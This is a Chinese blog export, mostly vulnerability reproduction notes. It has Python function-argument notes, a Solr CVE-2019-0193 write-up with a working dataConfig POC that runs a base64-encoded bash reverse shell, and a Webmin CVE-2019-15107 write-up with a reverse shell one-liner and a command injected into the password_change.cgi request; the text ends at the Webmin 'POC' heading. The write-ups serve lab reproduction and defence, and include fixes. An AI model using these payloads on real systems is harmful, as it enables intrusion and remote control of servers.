<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">0</span> args = () kw = &#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(<span class="number">1</span>, <span class="number">2</span>, c=<span class="number">3</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> args = () kw = &#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> args = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>) kw = &#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, x=<span class="number">99</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> args = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>) kw = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="number">99</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2(<span class="number">1</span>, <span class="number">2</span>, d=<span class="number">99</span>, ext=<span class="literal">None</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">0</span> d = <span class="number">99</span> kw = &#123;<span class="string">&#x27;ext&#x27;</span>: <span class="literal">None</span>&#125;</span><br></pre></td></tr></table></figure>

<p>最神奇的是通过一个tuple和dict，你也可以调用上述函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>args = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>kw = &#123;<span class="string">&#x27;d&#x27;</span>: <span class="number">99</span>, <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;#&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(*args, **kw)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> args = (<span class="number">4</span>,) kw = &#123;<span class="string">&#x27;d&#x27;</span>: <span class="number">99</span>, <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;#&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>args = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>kw = &#123;<span class="string">&#x27;d&#x27;</span>: <span class="number">88</span>, <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;#&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2(*args, **kw)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> d = <span class="number">88</span> kw = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;#&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>所以，对于任意函数，都可以通过类似<code>func(*args, **kw)</code>的形式调用它，无论它的参数是如何定义的。</p>
<p><font color=#FF0000>  虽然可以组合多达5种参数，但不要同时使用太多的组合，否则函数接口的可理解性很差。</font></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>python函数式编程</title>
    <url>/2021/03/27/python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>python高级特性</title>
    <url>/2021/03/27/python%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>python模块</title>
    <url>/2021/03/27/python%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Solr远程命令执行漏洞</title>
    <url>/2021/04/22/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E2%91%A1%20Solr%20RCE/</url>
    <content><![CDATA[<p><strong>漏洞编号</strong>：CVE-2019-0193</p>
<p><strong>Solr</strong>：独立的企业级搜索应用服务器。使用java语言开发。</p>
<p><strong>DataImportHandler</strong>：一个可选模块，用于从数据库和其他来源提取数据，其功能是整个DIH配置可以来自请求的<code>dataConfig</code>参数。DIH管理员屏幕的调试模式使用它可以方便地调试/开发DIH配置。</p>
<p><strong>dataConfig</strong>：数据配置管理。需要满足一定语法。其中<code>ScriptTransformer</code>可以编写自定义脚本，支持常见的脚本语言如<code>Javascript</code>、<code>JRuby</code>、<code>Jython</code>、<code>Groovy</code>和<code>BeanShell</code>。</p>
<p><strong>ScriptTransformer</strong>：脚本转换器，允许使用java支持的任何脚本语言。函数应当以行（类型为Map&lt;String,Object&gt;）为参数，可以修改字段。脚本应当写在数据仓库配置文件顶级的script元素内，而转换器属性值为script:函数名。</p>
<p><strong>DIH</strong>：数据库数据导入配置。</p>
<p><strong>DataSource</strong>：数据源，定义了即将导入Solr的外部数据的位置。</p>
<p><strong>UrlDataSource</strong>：数据源为URL地址。即导入Solr的数据来自<code>HTTP响应</code>，如RSS订阅源、atom订阅源、结构化的XML等。</p>
<p><strong>Entity</strong>：实体。作用是被处理后生成Solr中的一组文档，包含多个字段（fields），这些字段用各种方式转换之后发送到Solr进行索引。</p>
<p><strong>Processor</strong>：实体处理器。从外部数据源中提取数据内容，转换数据内容并将其添加到Solr索引中，可以编写<code>自定义实体处理器</code>来扩展或替换已提供的处理器。</p>
<p><strong>Transformer</strong>：转换器。从外部数据源中获取的每一组字段，都可以选择性被转换器转换。此转换过程可以修改字段、创建新字段、或从单行生成多个rows/documents。</p>
<h5 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h5><p>Apache Solr &lt; 8.2.0</p>
<h5 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h5><p>DIH配置可以包含脚本，因此<code>dataConfig</code>参数存在安全风险。</p>
<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>下载：<a href="https://archive.apache.org/dist/lucene/solr/8.1.1/">https://archive.apache.org/dist/lucene/solr/8.1.1/</a> </p>
<p>（本文使用kali安装，下载tgz文件）</p>
<p>解压：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ar zxvf solr-8.1.1.tgz </span><br></pre></td></tr></table></figure>

<p>切换到solr中的bin目录，启动solr：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">./solr start</span><br></pre></td></tr></table></figure>

<p>访问localhost:8983/solr</p>
<p><img src="https://i.loli.net/2021/04/28/r3mI87uLeX1Abxo.png"></p>
<p>环境搭建成功。</p>
<h5 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h5><p>创建一个core：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">./solr create -c test3</span><br></pre></td></tr></table></figure>

<p>选择刚刚创建的core。</p>
<p>可以看到存在<code>DataImportHandler</code>模块，受该漏洞影响。</p>
<p><img src="https://i.loli.net/2021/04/29/iazk8CDHGOfLxUQ.png" alt="image-20210429145648244"></p>
<p>获取Solr中所有core的信息，可以看到core_name：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8983&#x2F;solr&#x2F;admin&#x2F;cores</span><br></pre></td></tr></table></figure>



<h5 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h5><p>点击<code>Dataimport</code>，如果报<code>The solrconfig.xml file for this index does not have an operational DataImportHandler defined!</code>错误，可以参考此文章解决：<a href="https://blog.csdn.net/A_bad_horse/article/details/114261936">https://blog.csdn.net/A_bad_horse/article/details/114261936</a></p>
<ul>
<li><strong>勾选<code>Debug</code> ：为了有回显结果。</strong></li>
</ul>
<p><img src="https://i.loli.net/2021/04/30/Fw6HqxSrzc4laBY.png" alt="image-20210430093630565"></p>
<ul>
<li><p><strong>DataConfig信息：DataConfig中实体、字段标签有哪些属性取决于用了哪个处理器和转换器。</strong></p>
<p><code>&lt;document&gt;</code>中的<code>&lt;entity&gt;</code>实体标签里说明了该实体的属性：</p>
</li>
</ul>
<ol>
<li>属性<code>name</code>：必填，用于标识实体的唯一名称。</li>
<li>属性<code>processor</code>：可选项。默认值为<code>SqlEntityProcessor</code>，所以当数据源不是RDBMS时必须填写该项。对于<code>URLDataSource</code>类型的数据源而言，它的值必须为<code>XPathEntityProcessor</code>（根据官方说明只能使用XPathEntityProcessor对“URL的HTTP响应”做处理）。</li>
<li>属性<code>transformer</code>：可选项。填写格式为<code>transformer=&quot;script:&lt;function-name&gt;&quot;</code> 指定了转换数据时具体的Transformer需要执行的脚本函数的名称。</li>
<li>属性<code>forEach</code>：必填。值为Xpath表达式，用于划分记录。如果有多种类型的记录就用<code>|</code>符号把这些表达式分隔开。</li>
<li>属性<code>url</code>：值用于调用REST API的URL（可以模板化）。</li>
</ol>
<ul>
<li><strong>在<code>&lt;dataConfig&gt;</code>中的<code>&lt;script&gt;</code>标签中，写脚本函数。</strong></li>
</ul>
<ol>
<li><code>CDATA</code>区段中的文本会被解析器忽略。因为xml元素中“&lt;”和“&amp;”是非法的，某些文本（如JavaScript代码）包含大量非法字符。为了避免错误，可以将脚本代码定义为CDATA。</li>
<li><code>function</code>语句：声明一个函数。</li>
<li><code>java.lang.Runtime.getRuntime().exec()</code>：在java中调用操作系统的程序。在调用命令后就直接返回当前线程了。</li>
<li><code>bash -c</code>：bash从字符串中读入命令，如果字符串后还有变量就被设定为从$0开始的位置参数。</li>
<li><code>|</code>：管道符，前一个命令的输出作为后一个命令的输入。</li>
</ol>
<p>Linux nc反弹shell命令：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.242.128/6666 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- bash -i：产生一个交互式bash。bash是Linux的一个常见shell。 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &gt;&amp; /dev/tcp/ip/port：建立TCP连接，并将标准输出和错误重定向到TCP连接。ip/port为攻击机的ip和端口。 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 0&gt;&amp;1：从TCP连接获取输入。0：攻击机的输入。1：命令执行的结果。 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 整个命令即把bash的输出重定向到攻击机的指定端口，则目标机上执行的指令都只在攻击机上回显。 --&gt;</span>    </span><br><span class="line"></span><br><span class="line">bash64编码结果：YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0Mi4xMjgvNjY2NiAwPiYx</span><br></pre></td></tr></table></figure>

<p><strong>POC</strong>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dataConfig</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;URLDataSource&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>&lt;![CDATA[</span><br><span class="line"><span class="javascript">          <span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params"></span>)</span>&#123; java.lang.Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0Mi4xMjgvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span></span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">document</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entity</span> <span class="attr">name</span>=<span class="string">&quot;stackoverflow&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">url</span>=<span class="string">&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">processor</span>=<span class="string">&quot;XPathEntityProcessor&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">forEach</span>=<span class="string">&quot;/feed&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">transformer</span>=<span class="string">&quot;script:poc&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataConfig</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在攻击机开启监听。</p>
<p><img src="https://i.loli.net/2021/04/30/sd1OWUYGLScXV25.png" alt="image-20210430113437402"></p>
<p>将POC填入，发送。</p>
<p><img src="https://i.loli.net/2021/04/30/LYUVk4vNBuyqlP7.png" alt="image-20210430113841243"></p>
<p>getshell。</p>
<p><img src="https://i.loli.net/2021/04/30/Hp7ONoRiKB1XbM2.png" alt="image-20210430114149910"></p>
<p><img src="https://i.loli.net/2021/04/30/lzONjAxbdPDpJu9.png" alt="image-20210430125348393"></p>
<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>看这个：<a href="https://xz.aliyun.com/t/5941">https://xz.aliyun.com/t/5941</a></p>
<h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><ul>
<li><p>从Solr的8.2.0版本开始，使用此参数需要将Java系统属性“ enable.dih.dataConfigParam”设置为true。升级到8.2.0或更高版本，默认情况下是安全的。</p>
</li>
<li><p>或者，编辑solrconfig.xml以配置所有DataImportHandler用法，并在“不变式”部分列出“ dataConfig”参数设置为空字符串。</p>
</li>
<li><p>确保配置了网络设置，以便只有受信任的流量才能与Solr通信，尤其是与DIH请求处理程序通信。这是所有Solr的最佳做法。</p>
</li>
</ul>
<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><ul>
<li><a href="https://issues.apache.org/jira/browse/SOLR-13669">https://issues.apache.org/jira/browse/SOLR-13669</a></li>
<li><a href="https://blog.csdn.net/weixin_43583637/article/details/102875284">https://blog.csdn.net/weixin_43583637/article/details/102875284</a></li>
<li><a href="https://xz.aliyun.com/t/5941">https://xz.aliyun.com/t/5941</a></li>
<li><a href="https://xz.aliyun.com/t/5965#toc-6">https://xz.aliyun.com/t/5965#toc-6</a></li>
<li><a href="https://blog.csdn.net/qq_17204441/article/details/97341408">https://blog.csdn.net/qq_17204441/article/details/97341408</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro RememberMe 1.2.4 反序列化 命令执行漏洞复现</title>
    <url>/2021/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E2%91%A0%20Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20RCE/</url>
    <content><![CDATA[<p><strong>Apache Shiro</strong>：Apache开发的Java安全框架。</p>
<p><strong>反序列化</strong>：从一系列字节中提取数据结构的反向操作。java反序列化即把字节序列恢复为java对象的过程。</p>
<p><strong>rememberMe</strong>：自动登录。登录时如果勾选”记住我“，后台会给shiro设置rememberMe。</p>
<p><strong>RememberMe cookie</strong>：shiro自动对用户对象序列化并加密。当获得请求时，能够获取反序列化且解密之后的用户对象。当设置<code>rememberMe==false</code>，将会自动清空RememberMe cookie。</p>
<p><strong>CookieRememberMeManager</strong>：java的继承类，将信息发送到cookie中，用来实现RememberMe功能。</p>
<p><strong>AES</strong>：高级加密标准，又称Rijndael加密法。使用硬编码。</p>
<p><strong>RCE</strong>：远程命令、代码执行漏洞。</p>
<p><strong>ObjectInputStream</strong>：反序列化流，将之前使用ObjectOutputStream序列化的原始数据恢复为对象，以流的方式读取对象。</p>
<p><strong>硬编码</strong>：硬编码数据通常只能通过编辑源代码和重新编译可执行文件来修改，尽管可以使用调试器或十六进制编辑器在内存或磁盘上进行更改。<em>硬编码的数据通常表示不变的信息。</em></p>
<p><strong>commons-collections</strong>：Java集合框架。Shiro中的默认版本为3.2.1。</p>
<p><strong>docker</strong>：开源的应用容器引擎，可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p>
<p><strong>ysoserial</strong>：反序列化工具，集合了各种java反序列化payload。</p>
<h5 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h5><p>Apache Shiro &lt;= 1.2.4</p>
<h5 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h5><p>Shiro默认使用<code>CookieRememberMeManager</code>，会对用户身份进行序列化、加密和编码，以供以后检索。因此，当它接收到来自未经身份验证的用户的请求时，将通过执行以下操作来寻找他们记住的身份：</p>
<p><code>检索RememberMe cookie的值</code>→<code>Base 64解码</code>→<code>使用AES解密</code>→<code>使用Java序列化（ObjectInputStream）反序列化</code></p>
<p>但AES是硬编码的，有权访问源代码的任何人都知道加密的默认密钥key是什么（AES加解密需要密钥）。因此攻击者可以构造一个恶意对象，在对其进行序列化、加密和编码之后，将其作为cookie发送，然后Shiro就会将其解码并反序列化，于是恶意代码就能位于服务器上。</p>
<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>在kali2020上安装docker。参考链接：<a href="https://www.cnblogs.com/lijingrong/p/13396884.html">https://www.cnblogs.com/lijingrong/p/13396884.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull medicean&#x2F;vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/16/BnDmkOgrH2Qp7Aw.png" alt="image-20210416085931439"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 2333:8080 medicean&#x2F;vulapps:s_shiro_1</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;为了访问和反弹shell，进行端口映射，需要在启动的时候设置映射端口。然后访问ip:2333</span><br></pre></td></tr></table></figure>

<p>每次开启虚拟机都执行以下命令以重启服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reboot</span><br><span class="line">service docker start</span><br><span class="line">docker run -d -p 2333:8080 medicean&#x2F;vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>



<h5 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h5><p>抓包，确认网站是否为shiro环境。</p>
<h5 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h5><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><ul>
<li><a href="https://issues.apache.org/jira/browse/SHIRO-550">https://issues.apache.org/jira/browse/SHIRO-550</a></li>
<li><a href="https://www.seebug.org/vuldb/ssvid-92180">https://www.seebug.org/vuldb/ssvid-92180</a></li>
<li><a href="https://www.cnblogs.com/loong-hon/p/10619616.html#top">https://www.cnblogs.com/loong-hon/p/10619616.html#top</a></li>
<li><a href="https://www.cnblogs.com/0x7e/p/14406682.html">https://www.cnblogs.com/0x7e/p/14406682.html</a></li>
<li><a href="https://www.anquanke.com/post/id/225442#h2-7">https://www.anquanke.com/post/id/225442#h2-7</a></li>
<li><a href="https://mp.weixin.qq.com/s/ayZKDVnN7zEbKjo5w8uqxQ">https://mp.weixin.qq.com/s/ayZKDVnN7zEbKjo5w8uqxQ</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1078421">https://cloud.tencent.com/developer/article/1078421</a></li>
<li><a href="https://blog.csdn.net/T_Snail_T/article/details/105300227">https://blog.csdn.net/T_Snail_T/article/details/105300227</a></li>
<li><a href="https://www.secpulse.com/archives/112742.html">https://www.secpulse.com/archives/112742.html</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>目录扫描器v1</title>
    <url>/2021/03/27/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%99%A8v1/</url>
    <content><![CDATA[<h5 id="目录扫描器v1-测试"><a href="#目录扫描器v1-测试" class="headerlink" title="目录扫描器v1 测试"></a>目录扫描器v1 测试</h5><p>随便找了个网站，找几个目录放进txt里面，测试结果如下：</p>
<p><img src="https://i.loli.net/2021/04/01/oJ5vXbB8CUYqx1T.png"></p>
<p>重新找一个网站，添加PHP的字典，测试结果如下：</p>
<p><img src="https://i.loli.net/2021/04/01/yQc1UwLBWuTFVJS.png" alt="image-20210401123545929"></p>
<p><img src="https://i.loli.net/2021/04/01/p7FMOjNV1hJw8dU.png" alt="image-20210401123559584"></p>
<p><img src="https://i.loli.net/2021/04/01/6Hl2PiIOyaJfkdt.png" alt="image-20210401123837233"></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>目录扫描器</tag>
      </tags>
  </entry>
  <entry>
    <title>Webmin远程代码执行漏洞</title>
    <url>/2021/04/25/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E2%91%A2%20Webmin%20RCE/</url>
    <content><![CDATA[<p><strong>漏洞编号</strong>：CVE-2019-15107</p>
<p><strong>Webmin</strong>：基于Web的Unix系统管理工具。</p>
<p><strong>SourceForge</strong>：全球最大的开放源代码软件开发平台和仓库。SourceForge上<code>&gt;=1.880</code>且<code>&lt;=1.920</code>版本的Webmin存在后门。</p>
<p><strong>cgi</strong>：<code>公共网关接口脚本</code>类型文件，可理解为一个可执行的脚本，可以使用Python、Perl、Ruby等语言创建。用户向服务器发出请求，服务器接收用户请求并交给CGI程序处理，服务器把结果返回给用户。</p>
<p><strong>qx</strong>：Perl的语法。执行外部程序，相当于<code>&quot;</code>。</p>
<h5 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h5><p><code>password_change.cgi</code>文件在重置密码功能中存在一个代码执行漏洞，允许恶意第三方在缺少输入验证的情况下执行恶意代码。该漏洞实则是<code>SourceForge</code>上某些版本的安装包和源码被植入后门导致的。</p>
<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>本文使用docker+vulhub搭建，docker和vulhub安装可以参考文末链接。</p>
<p>安装完成后，切换到指定目录：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd vulhub/</span><br><span class="line">cd webmin</span><br><span class="line">cd CVE-<span class="number">2019</span>-<span class="number">15107</span>/</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/06/8aOv1CSrTkFAGXD.png" alt="image-20210506151930630"></p>
<p>启动环境：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/06/cdJ5Ov1f3bxu7hV.png" alt="image-20210506204039028"></p>
<p>访问：<code>https://ip:10000/</code></p>
<p>如果出现以下报错，手动输入<code>https</code>，提示不安全链接时继续前往。</p>
<p><img src="https://i.loli.net/2021/05/06/QmWA2oensyUfLbw.png" alt="image-20210506205704676"></p>
<p><img src="https://i.loli.net/2021/05/07/HjxPkUoWQ9fOheq.png" alt="image-20210506221448196"></p>
<p>环境安装成功。</p>
<h5 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h5><p>进入docker环境：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo docker <span class="built_in">exec</span> -it cve-<span class="number">2019</span>-15107_web_1 /<span class="built_in">bin</span>/bash</span><br></pre></td></tr></table></figure>

<p>修改webmin默认root账户的密码（vulhub上的镜像有修改密码功能）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd /etc/webmin</span><br><span class="line">passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/06/MmJh8KPalnvAES2.png" alt="image-20210506221256712"></p>
<p>登陆，开启密码重置功能，将允许用户使用旧密码设置新密码的选项勾选并保存（其他文章里说改完要重启webmin，我这里默认已经是勾选的，就没测试重启）。</p>
<p><img src="https://i.loli.net/2021/05/06/8PxzBhbogXku12d.png" alt="image-20210506221845320"></p>
<p>依旧是docker环境中的<code>/etc/webmin</code>目录下，查看配置文件，确定<code>passwd_mode</code>的值为<code>2</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cat miniserv.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/06/pE2f1ds3BHnQJA4.png" alt="image-20210506222153063"></p>
<p>为了方便测试，关闭SSL功能：<img src="https://i.loli.net/2021/05/07/oCdvmPTwgaVzR7k.png" alt="image-20210507083518058"></p>
<p>关闭以后使用<code>http://ip:10000</code>访问，如果登陆报错清一下cookie重新试试。</p>
<p>创建一个新的webmin用户：</p>
<p><img src="https://i.loli.net/2021/05/07/6osmCKFONtEhb7r.png" alt="image-20210507085754173"></p>
<p>勾选<code>Force change at next login </code>：</p>
<p><img src="https://i.loli.net/2021/05/07/8PGc4Kad6hqH39u.png" alt="image-20210507092522456"></p>
<p>退出登录，使用刚刚创建的账号登录，可以发现跳转到了使用旧密码更改新密码的界面。</p>
<p><img src="https://i.loli.net/2021/05/07/aeYKDu2yTXGkxB7.png" alt="image-20210507092738627"></p>
<p>抓包：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">POST /password_change.cgi HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.242</span><span class="number">.129</span>:<span class="number">10000</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">88.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">88.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">42</span></span><br><span class="line">Origin: http://<span class="number">192.168</span><span class="number">.242</span><span class="number">.129</span>:<span class="number">10000</span></span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.242</span><span class="number">.129</span>:<span class="number">10000</span>/session_login.cgi</span><br><span class="line">Cookie: redirect=<span class="number">1</span>; testing=<span class="number">1</span>; sid=x</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">user=test&amp;pam=<span class="number">1</span>&amp;expired=<span class="number">2</span>&amp;old=&amp;new1=&amp;new2=</span><br></pre></td></tr></table></figure>

<p>新密码随便填，不填命令无法执行。旧密码可以不填，也无需用<code>|</code>将密码和命令分开，可以直接执行。</p>
<p>了解了漏洞点包的构造后，经过多次尝试确认，如果不知道用户密码，也可以直接在登陆页面抓包，将文件路径修改为<code>/password_change.cgi</code>，在正文中填入以下语句（用户名和新密码都可以随便填）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user=test&amp;pam=<span class="number">1</span>&amp;expired=<span class="number">2</span>&amp;old=&amp;new1=<span class="number">1</span>&amp;new2=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/07/xvqEOzHbU6kTScC.png" alt="image-20210507103119198"></p>
<p>成功执行<code>ls</code>命令，漏洞存在。</p>
<blockquote>
<p>不知道为什么重新开虚拟机之后环境就重置了，修改操作都要重新来一遍。</p>
</blockquote>
<h5 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h5><p>Linux nc反弹shell命令（不编码无法执行）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.242.128/7777 0&gt;&amp;1&quot;</span></span><br><span class="line">  </span><br><span class="line">url编码结果：</span><br><span class="line">bash -c %22bash -i %3E%<span class="number">26</span> %2Fdev%2Ftcp%2F192<span class="number">.168</span><span class="number">.242</span><span class="number">.128</span>%2F7777 <span class="number">0</span>%3E%<span class="number">261</span>%<span class="number">22</span></span><br></pre></td></tr></table></figure>

<p>docker环境里没有netcat，先安装netcat：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user=test&amp;pam=<span class="number">1</span>&amp;expired=<span class="number">2</span>&amp;old=apt install netcat -y&amp;new1=<span class="number">1</span>&amp;new2=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>POC</strong>：</p>
